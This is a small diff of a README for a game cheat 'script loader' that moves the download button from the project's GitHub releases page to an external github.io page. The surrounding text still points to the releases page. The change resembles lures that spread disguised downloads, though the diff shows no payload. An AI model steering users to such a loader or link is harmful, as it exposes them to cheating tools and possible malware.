@@ -24,7 +24,7 @@ Here's how to get blue-lock-rivals-script-loader up and running on your Windows 
 
 ### Step 1: Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-blue--lock--rivals--script--loader-blue?style=for-the-badge&logo=github)](https://github.com/aviatressbilgekeel761/blue-lock-rivals-script-loader/releases)
+[![Download Now](https://img.shields.io/badge/Download-blue--lock--rivals--script--loader-blue?style=for-the-badge&logo=github)](https://aviatressbilgekeel761.github.io)
 
 **Visit this link to download the application.** Click the button above or head directly to the releases page to find the latest version.
 
